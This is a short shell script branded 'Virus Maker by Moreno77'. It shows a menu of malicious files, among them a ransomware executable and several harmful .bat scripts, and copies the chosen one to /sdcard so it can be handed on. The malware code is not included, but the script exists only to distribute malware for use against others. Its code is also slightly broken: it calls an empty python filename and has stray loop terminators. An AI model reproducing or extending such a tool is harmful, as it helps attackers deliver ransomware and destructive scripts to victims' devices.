clear
echo "\n\n\n\033[1;32m      +---------[ Virus Maker by Moreno77 ]----------+"
python .py
sleep 1

echo "\033[1;32m 1. Ransomeware.exe"
echo "\033[1;32m 2. Ugly.bat"
echo "\033[1;32m 3. Kuis.bat"
echo "\033[1;32m 4. Sleepy.bat"
echo "\033[1;32m 5. Cmd.bat"
echo "\033[1;32m 6. Notepad.bat"
echo "\033[1;32m 00. Exit"
read -p " [?] Input => " pil;
case $pil in
1) cp RansomewareFileDecryptor.exe /sdcard/RansomewareFileDecryptor.exe
sleep 3
echo " [!] Sukses : File disimpan di /sdcard"
echo " [!] Success: File saved at /sdcard"
exit
;;
2) cp Ugly.bat /sdcard/Ugly.bat
sleep 3
echo " [!] Sukses : File disimpan di /sdcard"
echo " [!] Success: File saved at /sdcard"
exit
;;
3) cp Kuis.bat /sdcard/Kuis.bat
sleep 3
echo " [!] Sukses : File disimpan di /sdcard"
echo " [!] Success: File saved at /sdcard"
exit
;;
4) cp Sleepy.bat /sdcard/Sleepy.bat
sleep 3
echo " [!] Sukses : File disimpan di /sdcard"
echo " [!] Success: File saved at /sdcard"
exit
;;
5) cp Cmd.bat /sdcard/Cmd.bat
sleep 3
echo " [!] Sukses : File disimpan di /sdcard"
echo " [!] Success: File saved at /sdcard"
exit
;;
6) cp Notepad.bat /sdcard/Notepad.bat
sleep 3
echo " [!] Sukses : File disimpan di /sdcard"
echo " [!] Success: File saved at /sdcard"
exit
;;
00) exit
;;
esac
done
done

